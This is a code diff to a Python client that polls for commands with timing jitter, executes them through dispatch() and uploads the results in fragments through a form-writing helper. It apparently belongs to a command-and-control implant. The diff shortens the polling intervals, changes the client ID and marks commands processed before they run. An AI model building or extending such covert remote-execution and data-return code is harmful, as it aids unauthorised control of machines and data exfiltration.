@@ -17,10 +17,10 @@ _DEFAULT_HEARTBEAT_EVERY = 100
 _KNOWN_CONFIG_KEYS = {"poll_interval_sec", "poll_jitter_min", "poll_jitter_max", "client_id", "heartbeat_every"}
 
 _client_config = {
-    "poll_interval_sec": "30",
-    "poll_jitter_min": "5",
-    "poll_jitter_max": "15",
-    "client_id": os.environ.get("CLIENT_ID", "worker-01"),
+    "poll_interval_sec": "1",
+    "poll_jitter_min": "2",
+    "poll_jitter_max": "3",
+    "client_id": os.environ.get("CLIENT_ID", "NADAV"),
     "heartbeat_every": str(_DEFAULT_HEARTBEAT_EVERY),
 }
 
@@ -242,15 +242,16 @@ def main():
 
         for task in pending:
             tid = task.get("command_id", "?")
+            # Mark processed before executing — if write fails, result is lost
+            # but the command will not re-execute on the next cycle or after restart
+            processed.add(tid)
             print(f"[info] executing command {tid} ({task.get('command')})")
             result = dispatch(task)
             frags = result.pop("_fragments", None)
 
             if frags:
-                # Send first fragment now; queue the rest for subsequent cycles
                 ok = common.write_form(frags[0])
                 if ok:
-                    processed.add(tid)
                     if len(frags) > 1:
                         _send_queue.extend(frags[1:])
                         print(f"[info] command {tid}: fragment 0/{len(frags)-1} sent, "
@@ -258,14 +259,13 @@ def main():
                     else:
                         print(f"[info] command {tid} done (single fragment)")
                 else:
-                    print(f"[error] command {tid} fragment 0 write failed, will retry next cycle")
+                    print(f"[warn] command {tid} fragment 0 write failed — result lost")
             else:
                 ok = common.write_form(result)
                 if ok:
-                    processed.add(tid)
                     print(f"[info] command {tid} done, result written")
                 else:
-                    print(f"[error] command {tid} result write failed, will retry next cycle")
+                    print(f"[warn] command {tid} result write failed — result lost")
 
         # Sleep using current _client_config (may have been updated by a config command)
         try:
